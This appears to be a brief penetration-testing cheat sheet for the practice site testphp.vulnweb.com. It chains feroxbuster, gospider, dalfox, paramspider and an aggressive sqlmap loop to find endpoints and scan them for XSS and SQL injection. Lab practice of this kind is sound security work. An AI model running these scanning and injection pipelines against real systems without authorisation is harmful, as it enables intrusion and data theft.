Finding endpoints:
`feroxbuster -u <http://testphp.vulnweb.com/> -e -q --no-state -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ferox.txt`

Extract URLs only that are status code 200 and doesnt not contain useless extensions:
`cat ferox.txt | grep -e '200' | grep -oE 'https?://[^[:space:]]+' | grep -Ev '\.(gif|png|jpg|js|css|txt)$' > 2URLS.txt`

`gospider -s <http://testphp.vulnweb.com> -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt` 

`cat katana.txt | grep "="`

`cat domains.txt | paramspider -o output_directory -l high`

`gospider -s <http://testphp.vulnweb.com> -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" | grep -e "code-200" | awk '{print $5}' | grep "=" | while read -r url; do sqlmap -u "$url" --batch --level=5 --risk=3 --random-agent --output-dir=./sqlmap; done`